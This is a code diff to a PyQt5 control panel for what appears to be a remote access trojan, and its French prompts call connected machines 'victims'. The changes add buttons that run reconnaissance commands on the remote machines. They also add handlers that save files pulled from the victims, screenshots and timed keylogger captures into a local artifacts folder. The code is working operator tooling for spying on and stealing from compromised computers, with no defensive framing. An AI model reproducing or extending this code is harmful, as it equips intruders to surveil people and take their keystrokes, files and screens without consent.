@@ -24,9 +24,10 @@ from PyQt5.QtWidgets import (
     QFileDialog,
     QSpinBox,
     QGroupBox,
+    QInputDialog,
 )
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
-from PyQt5.QtGui import QFont, QColor
+from PyQt5.QtGui import QFont
 
 
 class ListenerThread(QThread):
@@ -134,6 +135,10 @@ class ClientTab(QWidget):
         self.parent = parent
         self.listener_thread = None
         self.current_client = None
+        self.pending_downloads = {}
+        self.pending_screenshots = {}
+        self.artifacts_root = Path.home() / "pupy_artifacts"
+        self.artifacts_root.mkdir(parents=True, exist_ok=True)
         self.init_ui()
 
     def init_ui(self):
@@ -208,6 +213,28 @@ class ClientTab(QWidget):
         commands_group.setLayout(commands_layout)
         layout.addWidget(commands_group)
 
+        # === Quick Actions ===
+        actions_group = QGroupBox("🧰 Quick Actions")
+        actions_layout = QHBoxLayout()
+        quick_actions = [
+            ("Whoami", "whoami"),
+            ("Hostname", "hostname"),
+            ("IP Config", "ipconfig /all"),
+            ("System Info", "systeminfo"),
+            ("List Processes", "tasklist"),
+        ]
+        for label, command in quick_actions:
+            btn = QPushButton(label)
+            btn.clicked.connect(lambda _, cmd=command: self.send_exec_command(cmd))
+            actions_layout.addWidget(btn)
+
+        info_btn = QPushButton("Client Info")
+        info_btn.clicked.connect(self.request_client_info)
+        actions_layout.addWidget(info_btn)
+
+        actions_group.setLayout(actions_layout)
+        layout.addWidget(actions_group)
+
         # === Output ===
         output_group = QGroupBox("📊 Output")
         output_layout = QVBoxLayout()
@@ -247,15 +274,15 @@ class ClientTab(QWidget):
         self.clients_list.addItem(item)
         self.output_text.append(f"\n[+] Client connected: {client_ip}")
         self.output_text.append(f"    {info}\n")
-        
+
         # ALERTE: Nouvelle victime!
         QMessageBox.information(
-            self, 
-            "🔔 Nouvelle Victime!", 
+            self,
+            "🔔 Nouvelle Victime!",
             f"Client connecté!\n\n"
             f"IP: {client_ip}\n"
             f"Info: {info}\n\n"
-            f"Vous avez maintenant {self.clients_list.count()} victime(s) connectée(s)."
+            f"Vous avez maintenant {self.clients_list.count()} victime(s) connectée(s).",
         )
 
     def on_client_selected(self, item):
@@ -265,7 +292,99 @@ class ClientTab(QWidget):
 
     def on_client_data(self, client_ip, data):
         """Data received from client"""
-        self.output_text.append(f"[{client_ip}] {data}")
+        data_type = data.get("type")
+
+        if data_type == "exec":
+            output = data.get("output", "")
+            self.output_text.append(f"\n[{client_ip}] Command output:\n{output}\n")
+
+        elif data_type == "download":
+            if data.get("success"):
+                local_path = self.pending_downloads.pop(client_ip, None)
+                if not local_path:
+                    local_path = self._artifact_path(
+                        "downloads", Path(data.get("file", "downloaded.bin")).name
+                    )
+                try:
+                    file_data = base64.b64decode(data.get("data", ""))
+                    local_path.parent.mkdir(parents=True, exist_ok=True)
+                    with open(local_path, "wb") as f:
+                        f.write(file_data)
+                    self.output_text.append(
+                        f"\n[{client_ip}] Download saved to {local_path}\n"
+                    )
+                except Exception as e:
+                    self.output_text.append(
+                        f"\n[{client_ip}] Failed to save download: {e}\n"
+                    )
+            else:
+                self.output_text.append(
+                    f"\n[{client_ip}] Download failed: {data.get('error', 'unknown error')}\n"
+                )
+
+        elif data_type == "upload":
+            if data.get("success"):
+                self.output_text.append(
+                    f"\n[{client_ip}] Upload complete: {data.get('file')}\n"
+                )
+            else:
+                self.output_text.append(
+                    f"\n[{client_ip}] Upload failed: {data.get('error', 'unknown error')}\n"
+                )
+
+        elif data_type == "screenshot":
+            if data.get("success"):
+                local_path = self.pending_screenshots.pop(client_ip, None)
+                if not local_path:
+                    filename = (
+                        f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+                    )
+                    local_path = self._artifact_path("screenshots", filename)
+                try:
+                    img_data = base64.b64decode(data.get("data", ""))
+                    local_path.parent.mkdir(parents=True, exist_ok=True)
+                    with open(local_path, "wb") as f:
+                        f.write(img_data)
+                    self.output_text.append(
+                        f"\n[{client_ip}] Screenshot saved to {local_path}\n"
+                    )
+                except Exception as e:
+                    self.output_text.append(
+                        f"\n[{client_ip}] Failed to save screenshot: {e}\n"
+                    )
+            else:
+                self.output_text.append(f"\n[{client_ip}] Screenshot failed\n")
+
+        elif data_type == "keylog":
+            keys = data.get("keys") or data.get("error", "No data")
+            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            local_path = self._artifact_path("keylogs", filename)
+            try:
+                local_path.parent.mkdir(parents=True, exist_ok=True)
+                with open(local_path, "w", encoding="utf-8") as f:
+                    f.write(keys)
+                self.output_text.append(
+                    f"\n[{client_ip}] Keylog saved to {local_path}\n"
+                )
+            except Exception as e:
+                self.output_text.append(f"\n[{client_ip}] Failed to save keylog: {e}\n")
+
+        elif data_type == "info":
+            info_lines = [
+                f"Hostname: {data.get('hostname', 'n/a')}",
+                f"Platform: {data.get('platform', 'n/a')}",
+                f"User: {data.get('user', 'n/a')}",
+                f"Listener: {data.get('ip', 'n/a')}:{data.get('port', 'n/a')}",
+            ]
+            self.output_text.append(
+                f"\n[{client_ip}] Client info:\n" + "\n".join(info_lines) + "\n"
+            )
+
+        elif data_type == "exit":
+            self.output_text.append(f"\n[{client_ip}] Client disconnected\n")
+
+        else:
+            self.output_text.append(f"[{client_ip}] {data}")
 
     def execute_command(self):
         """Execute command on selected client"""
@@ -292,6 +411,13 @@ class ClientTab(QWidget):
             return
 
         command = {"cmd": "screenshot"}
+        filename = (
+            f"{self.current_client.replace(':', '_')}_"
+            f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+        )
+        self.pending_screenshots[self.current_client] = self._artifact_path(
+            "screenshots", filename
+        )
         if self.listener_thread.send_command(self.current_client, command):
             self.output_text.append(f"\n[>] Screenshot request sent\n")
         else:
@@ -303,13 +429,31 @@ class ClientTab(QWidget):
             QMessageBox.warning(self, "Error", "No client selected")
             return
 
-        file_path, _ = QFileDialog.getOpenFileName(self, "Select file to download")
-        if file_path:
-            command = {"cmd": "download", "file": file_path}
-            if self.listener_thread.send_command(self.current_client, command):
-                self.output_text.append(f"\n[>] Download request: {file_path}\n")
-            else:
-                QMessageBox.critical(self, "Error", "Failed to send command")
+        remote_path, ok = QInputDialog.getText(
+            self,
+            "Remote File",
+            "Chemin complet du fichier sur la victime:",
+        )
+        if not ok or not remote_path:
+            return
+
+        suggested_name = Path(remote_path).name or "downloaded.bin"
+        local_path, _ = QFileDialog.getSaveFileName(
+            self,
+            "Sauvegarder le fichier",
+            str(self._artifact_path("downloads", suggested_name)),
+        )
+        if not local_path:
+            return
+
+        self.pending_downloads[self.current_client] = Path(local_path)
+        command = {"cmd": "download", "file": remote_path}
+        if self.listener_thread.send_command(self.current_client, command):
+            self.output_text.append(
+                f"\n[>] Download request: {remote_path} -> {local_path}\n"
+            )
+        else:
+            QMessageBox.critical(self, "Error", "Failed to send command")
 
     def cmd_upload(self):
         """Upload file to client"""
@@ -323,10 +467,20 @@ class ClientTab(QWidget):
                 with open(file_path, "rb") as f:
                     data = base64.b64encode(f.read()).decode()
 
-                dest = Path(file_path).name
-                command = {"cmd": "upload", "file": f"C:\\{dest}", "data": data}
+                dest_path, ok = QInputDialog.getText(
+                    self,
+                    "Destination",
+                    "Chemin complet de destination sur la victime:",
+                    text=f"C:\\{Path(file_path).name}",
+                )
+                if not ok or not dest_path:
+                    return
+
+                command = {"cmd": "upload", "file": dest_path, "data": data}
                 if self.listener_thread.send_command(self.current_client, command):
-                    self.output_text.append(f"\n[>] Upload: {file_path} -> {dest}\n")
+                    self.output_text.append(
+                        f"\n[>] Upload: {file_path} -> {dest_path}\n"
+                    )
                 else:
                     QMessageBox.critical(self, "Error", "Failed to send command")
             except Exception as e:
@@ -337,9 +491,48 @@ class ClientTab(QWidget):
         if not self.current_client:
             QMessageBox.warning(self, "Error", "No client selected")
             return
+        duration, ok = QInputDialog.getInt(
+            self,
+            "Keylogger",
+            "Durée en secondes:",
+            value=60,
+            min=10,
+            max=600,
+        )
+        if not ok:
+            return
 
-        command = {"cmd": "keylog", "duration": 60}
+        command = {"cmd": "keylog", "duration": duration}
         if self.listener_thread.send_command(self.current_client, command):
-            self.output_text.append(f"\n[>] Keylogger started (60s)\n")
+            self.output_text.append(f"\n[>] Keylogger started ({duration}s)\n")
         else:
             QMessageBox.critical(self, "Error", "Failed to send command")
+
+    def send_exec_command(self, command_text: str):
+        """Send predefined exec command via button."""
+        if not self.current_client:
+            QMessageBox.warning(self, "Error", "No client selected")
+            return
+
+        command = {"cmd": "exec", "data": command_text}
+        if self.listener_thread.send_command(self.current_client, command):
+            self.output_text.append(f"\n[>] Command sent: {command_text}\n")
+        else:
+            QMessageBox.critical(self, "Error", "Failed to send command")
+
+    def request_client_info(self):
+        """Request system information from client."""
+        if not self.current_client:
+            QMessageBox.warning(self, "Error", "No client selected")
+            return
+
+        command = {"cmd": "info"}
+        if self.listener_thread.send_command(self.current_client, command):
+            self.output_text.append("\n[>] Client info request sent\n")
+        else:
+            QMessageBox.critical(self, "Error", "Failed to send command")
+
+    def _artifact_path(self, category: str, filename: str) -> Path:
+        """Utility to build artifact storage path."""
+        safe_filename = filename or "artifact.bin"
+        return self.artifacts_root / category / safe_filename
